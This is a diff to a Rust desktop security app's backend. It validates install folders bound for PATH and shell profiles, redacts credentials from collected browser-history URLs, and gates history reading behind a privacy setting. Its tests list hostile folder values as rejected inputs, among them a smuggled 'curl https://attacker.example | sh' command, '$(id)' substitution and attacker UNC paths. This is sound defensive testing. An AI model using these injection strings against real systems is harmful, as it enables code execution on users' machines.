@@ -14,6 +14,9 @@
 //! the local webview.
 
 use crate::state::AppState;
+// Address redaction is shared with the CLI and checked against the backend's
+// and the phone's examples (cyberforge_core::redact).
+pub(crate) use cyberforge_core::redact::redact_url;
 use serde_json::{json, Value};
 use std::path::Path;
 use std::sync::Arc;
@@ -131,6 +134,49 @@ fn default_install_target() -> InstallTarget {
             kind: "linux".into(),
         }
     }
+}
+
+/// The PATH entry for the install folder a page passed (none: the default), or
+/// why it cannot be one (SEC-05). The folder is added to the user's PATH, and on
+/// macOS/Linux written into a shell profile inside `export PATH="$PATH:…"`, so
+/// it must be a full local path with no `..`, no control characters, no PATH
+/// separator, and on macOS/Linux none of the characters the shell would read
+/// inside that double-quoted line (`"`, `$`, `` ` ``, `\`). Network (UNC) paths
+/// are refused on Windows: commands found on PATH would run from another host.
+fn checked_bin(install_dir: Option<&str>) -> Result<String, String> {
+    let Some(dir) = install_dir.map(str::trim).filter(|d| !d.is_empty()) else {
+        return Ok(default_install_target().bin);
+    };
+    let refuse = |why: &str| Err(format!("The install folder cannot be used: {why}."));
+    if dir.chars().count() > 400 {
+        return refuse("it is longer than 400 characters");
+    }
+    if dir.chars().any(char::is_control) {
+        return refuse("it contains control characters");
+    }
+    let path = std::path::Path::new(dir);
+    if !path.is_absolute() {
+        return refuse("give a full path");
+    }
+    if path.components().any(|c| matches!(c, std::path::Component::ParentDir)) {
+        return refuse("it contains \"..\"");
+    }
+    #[cfg(target_os = "windows")]
+    {
+        if dir.starts_with(r"\\") || dir.starts_with("//") {
+            return refuse("network paths are not allowed");
+        }
+        if dir.contains(';') || dir.contains('"') {
+            return refuse("it contains ; or \"");
+        }
+    }
+    #[cfg(not(target_os = "windows"))]
+    {
+        if dir.chars().any(|c| matches!(c, ':' | '"' | '$' | '`' | '\\')) {
+            return refuse("it contains one of : \" $ ` \\");
+        }
+    }
+    Ok(join_bin(dir))
 }
 
 /// `<install dir>/bin` for whatever directory the user chose, normalised so we
@@ -284,6 +330,12 @@ fn stat_hist(p: &str) -> Option<HistFile> {
 /// (and the file is usually locked while the browser runs), so we deliberately
 /// only confirm the database exists and report its size + last-modified time —
 /// enough to prove "history detected, on-device" without ever opening it.
+/// Whether any supported browser's history file can be found on this computer
+/// (what a device heartbeat reports as `browser_history`).
+pub fn collected_history_available() -> bool {
+    browser_defs().iter().any(|d| locate_history(d).is_some())
+}
+
 fn locate_history(d: &BrowserDef) -> Option<HistFile> {
     if d.firefox {
         let dir = d.history_paths.first()?;
@@ -796,6 +848,9 @@ pub async fn resolve_ip(host: String) -> Result<Value, String> {
         h = &h[at + 1..];
     }
     let hostname = h.split(':').next().unwrap_or(h).trim().trim_matches('.').to_string();
+    if hostname.len() > 253 || hostname.chars().any(|c| c.is_whitespace() || c.is_control()) {
+        return Ok(json!({ "success": false, "error": "That is not a host name" }));
+    }
     if hostname.is_empty() {
         return Ok(json!({ "success": false, "error": "Enter a website or domain" }));
     }
@@ -866,10 +921,7 @@ pub async fn get_system_profile() -> Result<Value, String> {
 /// Report whether the CyberForge bin directory is already on PATH.
 #[tauri::command]
 pub async fn get_path_status(install_dir: Option<String>) -> Result<Value, String> {
-    let bin = match install_dir {
-        Some(d) if !d.trim().is_empty() => join_bin(&d),
-        _ => default_install_target().bin,
-    };
+    let bin = checked_bin(install_dir.as_deref())?;
     Ok(json!({ "success": true, "bin": bin, "present": path_contains(&bin) }))
 }
 
@@ -877,10 +929,7 @@ pub async fn get_path_status(install_dir: Option<String>) -> Result<Value, Strin
 /// elevation-free; the bin directory is created so the PATH entry is valid.
 #[tauri::command]
 pub async fn add_to_path(install_dir: Option<String>) -> Result<Value, String> {
-    let bin = match install_dir {
-        Some(d) if !d.trim().is_empty() => join_bin(&d),
-        _ => default_install_target().bin,
-    };
+    let bin = checked_bin(install_dir.as_deref())?;
     let status = add_bin_to_path(&bin)?;
     Ok(json!({
         "success": true,
@@ -973,12 +1022,12 @@ pub fn prepare_filesystem(app: &tauri::AppHandle) {
         );
     }
 
-    // 3) Editable Hugging Face token config. Seeded EMPTY (never a fake token,
-    //    so get_hf_token() correctly reports "not connected" until the user
-    //    sets one from Settings -> AI & Models or edits this file).
+    // 3) Import slot for a Hugging Face token. Seeded EMPTY. The token itself is
+    //    kept in the system credential store (see auth.rs): one pasted here is
+    //    moved there at the next start and removed from this file.
     seed(
         dir.join("hf_config.json"),
-        "{\n  \"_comment\": \"CyberForge AI (DeepSeek via Hugging Face). Paste your token in \\\"active\\\", or save it from Settings -> AI & Models. Local to this machine; never committed.\",\n  \"active\": \"\",\n  \"tokens\": []\n}\n",
+        "{\n  \"_comment\": \"The Hugging Face token is kept in the system credential store, not in this file. Save it from Settings -> AI & Models, or paste it in \\\"active\\\" and restart: it is moved to the credential store and removed from this file.\",\n  \"active\": \"\",\n  \"tokens\": []\n}\n",
     );
 
     // 4) Application manifest — an integration descriptor for the install.
@@ -1088,7 +1137,9 @@ pub fn prepare_filesystem(app: &tauri::AppHandle) {
             Layout:\n\
             - manifest.json    App + install descriptor.\n\
             - version          Installed version.\n\
-            - hf_config.json   Your Hugging Face token for the AI assistant (editable).\n\
+            - hf_config.json   Import slot for a Hugging Face token. A token pasted here is\n\
+            \x20                  moved to the system credential store at the next start and\n\
+            \x20                  removed from this file.\n\
             - config/          settings.json, preferences.json, policies.json, integrations.json\n\
             - logs/            app.log, audit.log\n\
             - cache/           Transient scan/render cache.\n\
@@ -1102,7 +1153,13 @@ pub fn prepare_filesystem(app: &tauri::AppHandle) {
             Created on first run by the app. Files written as you use it:\n\
             - memories.json    Local vector memory: scans, intel, reports, actions.\n\
             - blocklist.json / protected.json / allowed.json   Your site lists.\n\
-            - session.json     Your signed-in session (token cache).\n\
+            - device.json      This installation's ID and device ID (its key is in the\n\
+            \x20                  system credential store, not here).\n\
+            - hosts.original / hosts.previous   The hosts file before CyberForge's first\n\
+            \x20                  change and before its latest one. Copy hosts.original over\n\
+            \x20                  the hosts file (as administrator) to undo every block.\n\
+            - session.json     Your cached profile, so the app can open offline. The\n\
+            \x20                  sign-in token is in the system credential store, not here.\n\
             - install.json     One-time install marker.\n\n\
             To remove all CyberForge data, delete this folder (or run the\n\
             uninstall script shipped with the app).\n",
@@ -1135,6 +1192,8 @@ pub async fn mark_installed(
     app: tauri::AppHandle,
     install_dir: Option<String>,
 ) -> Result<Value, String> {
+    // recorded only: checked the same way as the folder add_to_path uses
+    checked_bin(install_dir.as_deref())?;
     let path = install_marker(&app).ok_or_else(|| "no app-config dir".to_string())?;
     if let Some(parent) = path.parent() {
         std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
@@ -1305,6 +1364,14 @@ fn assemble_history(
     sources: u32,
     cap: usize,
 ) -> Value {
+    // Credentials are removed from every address before it is kept, listed,
+    // scanned or written to disk. Done first, so addresses that differ only in
+    // a token are counted once.
+    for item in items.iter_mut() {
+        if let Some(clean) = item.get("url").and_then(|u| u.as_str()).map(redact_url) {
+            item["url"] = Value::String(clean);
+        }
+    }
     items.sort_by(|a, b| {
         b["lastVisit"].as_i64().unwrap_or(0).cmp(&a["lastVisit"].as_i64().unwrap_or(0))
     });
@@ -1410,6 +1477,10 @@ pub async fn collect_history_snapshot(per_db: usize, cap: usize) -> Value {
 /// Run a full collection and store it in shared state (so UI commands serve it
 /// instantly). Called by the startup background task and on cache-miss.
 pub async fn refresh_history(state: &SharedState) -> Value {
+    // the collector reads nothing unless the user turned history reading on (SEC-07)
+    if let Err(reason) = crate::privacy::require(crate::privacy::Feature::HistoryAccess) {
+        return json!({ "success": false, "error": reason, "data": null });
+    }
     let snapshot = collect_history_snapshot(HISTORY_PER_DB, HISTORY_CAP).await;
     let mut s = state.lock().await;
     s.history_cache = Some((Instant::now(), snapshot.clone()));
@@ -1432,8 +1503,30 @@ pub async fn history_data(state: &SharedState) -> Value {
 
 /// Persist the latest snapshot to the app-config dir so the collection survives
 /// restarts and is available locally (never uploaded anywhere).
+/// Delete the copy of browser history this app keeps: the cached snapshot and
+/// the file it is saved to. Returns how many files were removed.
+pub async fn clear_collected_history(state: &SharedState) -> usize {
+    state.lock().await.history_cache = None;
+    let mut removed = 0;
+    if let Some(dir) = crate::auth::config_dir() {
+        for name in ["history_collection.json"] {
+            if std::fs::remove_file(dir.join(name)).is_ok() {
+                removed += 1;
+            }
+        }
+    }
+    removed
+}
+
 pub fn persist_history_snapshot(app: &tauri::AppHandle, snapshot: &Value) {
     use tauri::Manager;
+    if !crate::privacy::allowed(crate::privacy::Feature::HistoryAccess) {
+        return;
+    }
+    // Only the owner of this computer's state writes the saved copy (ownership.rs).
+    if !crate::ownership::is_owner_or_unenforced() {
+        return;
+    }
     if let Ok(dir) = app.path().app_config_dir() {
         let _ = std::fs::create_dir_all(&dir);
         let path = dir.join("history_collection.json");
@@ -1452,6 +1545,7 @@ pub async fn get_browser_history(
     state: State<'_, SharedState>,
     limit: Option<usize>,
 ) -> Result<Value, String> {
+    crate::privacy::require(crate::privacy::Feature::HistoryAccess)?;
     let limit = limit.unwrap_or(25).clamp(1, 200);
     let snapshot = history_data(state.inner()).await;
     // Slice the cached aggregate down to the requested size without re-reading.
@@ -1477,6 +1571,7 @@ pub async fn get_browser_history(
 /// Served instantly from the in-memory cache the startup collector populates.
 #[tauri::command]
 pub async fn get_collected_history(state: State<'_, SharedState>) -> Result<Value, String> {
+    crate::privacy::require(crate::privacy::Feature::HistoryAccess)?;
     Ok(history_data(state.inner()).await)
 }
 
@@ -1526,5 +1621,145 @@ mod diag {
             }
         }
         assert_eq!(v["success"], serde_json::json!(true));
+    }
+}
+
+#[cfg(test)]
+mod redaction_tests {
+    use super::*;
+    use cyberforge_core::redact::{is_secret_parameter, REDACTED};
+
+    #[test]
+    fn credentials_in_a_query_are_removed_and_the_rest_is_kept() {
+        assert_eq!(
+            redact_url("https://accounts.example.com/signin/oauth?client_id=abc&code=4/0AfJohXkabc&state=xyz123&hl=en"),
+            "https://accounts.example.com/signin/oauth?client_id=abc&code=[redacted]&state=[redacted]&hl=en"
+        );
+        assert_eq!(
+            redact_url("https://app.example.com/reset?_autologintoken=abcdef123456&next=/home"),
+            "https://app.example.com/reset?_autologintoken=[redacted]&next=/home"
+        );
+        assert_eq!(
+            redact_url("https://api.example.com/v1/items?api_key=K1&session_id=S2&csrfToken=C3&page=2"),
+            "https://api.example.com/v1/items?api_key=[redacted]&session_id=[redacted]&csrfToken=[redacted]&page=2"
+        );
+    }
+
+    #[test]
+    fn a_token_is_recognised_by_its_shape_whatever_it_is_called() {
+        let jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";
+        assert_eq!(redact_url(&format!("https://example.com/open?t={}", jwt)), "https://example.com/open?t=[redacted]");
+        assert_eq!(redact_url(&format!("https://example.com/verify/{}/done", jwt)), "https://example.com/verify/[redacted]/done");
+        assert_eq!(
+            redact_url("https://example.com/cb#access_token=ya29.a0AfH6SMBx&token_type=Bearer&expires_in=3599"),
+            "https://example.com/cb#access_token=[redacted]&token_type=[redacted]&expires_in=3599"
+        );
+        let opaque = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6";
+        assert_eq!(redact_url(&format!("https://example.com/dl?ref={}", opaque)), "https://example.com/dl?ref=[redacted]");
+    }
+
+    #[test]
+    fn a_password_in_the_address_itself_is_removed() {
+        assert_eq!(redact_url("https://alice:s3cret@intranet.example.com/wiki?page=1"), "https://intranet.example.com/wiki?page=1");
+    }
+
+    #[test]
+    fn ordinary_addresses_are_unchanged() {
+        for url in [
+            "https://example.com/",
+            "https://example.com/docs/getting-started#install",
+            "https://www.google.com/search?q=how+to+rotate+an+api+key+in+2026+without+downtime+for+users&hl=en",
+            "https://shop.example.com/products?category=laptops&sort=price&page=3",
+            "https://github.com/rust-lang/rust/issues/12345",
+            "http://192.168.1.1/admin/index.html",
+            "chrome://settings/",
+            "mailto:someone@example.com",
+        ] {
+            assert_eq!(redact_url(url), url);
+        }
+    }
+
+    #[test]
+    fn the_collected_history_holds_no_credentials_and_counts_an_address_once() {
+        let jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";
+        let items = vec![
+            json!({ "url": format!("https://example.com/stream?token={}", jwt), "title": "a", "lastVisit": 30 }),
+            json!({ "url": "https://example.com/stream?token=another-session-token", "title": "b", "lastVisit": 20 }),
+            json!({ "url": "https://example.org/page", "title": "c", "lastVisit": 10 }),
+        ];
+        let snapshot = assemble_history(items, std::collections::BTreeMap::new(), 1, 50);
+        let text = snapshot.to_string();
+        assert!(!text.contains("eyJ") && !text.contains("another-session-token"));
+        assert_eq!(snapshot["data"]["count"], 2, "two visits to the same page with different tokens are one address");
+        assert_eq!(snapshot["data"]["history"][0]["url"], "https://example.com/stream?token=[redacted]");
+    }
+
+    /// Diagnostic over the history file already on this machine. Prints counts
+    /// only, never an address. Not part of the normal run:
+    ///   cargo test --lib redaction_tests::the_file_on_this_machine -- --ignored --nocapture
+    #[test]
+    #[ignore]
+    fn the_file_on_this_machine_would_hold_no_credential_shaped_values() {
+        let Ok(appdata) = std::env::var("APPDATA") else { return };
+        let path = std::path::PathBuf::from(appdata).join("com.cyberforge.console").join("history_collection.json");
+        let Ok(text) = std::fs::read_to_string(&path) else { println!("no history file on this machine"); return };
+        let stored: Value = serde_json::from_str(&text).expect("the file is JSON");
+        let urls: Vec<String> = stored["data"]["history"].as_array().map(|a| a.iter().filter_map(|i| i["url"].as_str().map(String::from)).collect()).unwrap_or_default();
+        let jwt_like = |u: &str| u.split(|c: char| !(c.is_ascii_alphanumeric() || "_-.".contains(c))).any(|t| t.starts_with("eyJ") && t.len() >= 40 && t.contains('.'));
+        let before = urls.iter().filter(|u| jwt_like(u)).count();
+        let cleaned: Vec<String> = urls.iter().map(|u| redact_url(u)).collect();
+        let after = cleaned.iter().filter(|u| jwt_like(u)).count();
+        let changed = urls.iter().zip(&cleaned).filter(|(a, b)| a != b).count();
+        let named_left = cleaned.iter().filter(|u| u.split(['?', '&', '#']).skip(1).any(|pair| matches!(pair.split_once('='), Some((n, v)) if is_secret_parameter(n) && !v.is_empty() && v != REDACTED))).count();
+        println!("addresses: {} | changed by redaction: {} | holding a JWT-shaped value before: {} after: {} | credential-named parameters left with a value: {}", urls.len(), changed, before, after, named_left);
+        assert_eq!(after, 0);
+        assert_eq!(named_left, 0);
+    }
+}
+
+
+#[cfg(test)]
+mod install_dir_tests {
+    use super::checked_bin;
+
+    #[test]
+    fn no_folder_means_the_default() {
+        assert!(checked_bin(None).unwrap().ends_with("bin"));
+        assert!(checked_bin(Some("   ")).unwrap().ends_with("bin"));
+    }
+
+    #[cfg(target_os = "windows")]
+    #[test]
+    fn a_windows_folder_is_a_full_local_path_with_nothing_extra() {
+        assert_eq!(checked_bin(Some(r"C:\Tools\CyberForge")).unwrap(), r"C:\Tools\CyberForge\bin");
+        for bad in [
+            r"Tools\CyberForge",                      // relative
+            r"C:\Tools;C:\Users\Public\evil",         // a second PATH entry
+            r"\\attacker.example\share\tools",       // network path
+            "//attacker.example/share/tools",        // network path, forward slashes
+            r"C:\Tools\..\Windows\Temp",              // climbs out
+            "C:\\Tools\nC:\\evil",                  // control character
+            r#"C:\Tools"\x"#,
+        ] {
+            assert!(checked_bin(Some(bad)).is_err(), "accepted {bad:?}");
+        }
+        assert!(checked_bin(Some(&format!(r"C:\{}", "a".repeat(450)))).is_err());
+    }
+
+    #[cfg(not(target_os = "windows"))]
+    #[test]
+    fn a_unix_folder_cannot_inject_into_the_shell_profile() {
+        assert_eq!(checked_bin(Some("/opt/cyberforge")).unwrap(), "/opt/cyberforge/bin");
+        for bad in [
+            "opt/cyberforge",
+            "/opt/x\"; curl https://attacker.example | sh; echo \"",
+            "/opt/$(id)",
+            "/opt/`id`",
+            "/opt/a:/tmp/evil",
+            "/opt/../tmp",
+            "/opt/a\\b",
+        ] {
+            assert!(checked_bin(Some(bad)).is_err(), "accepted {bad:?}");
+        }
     }
 }
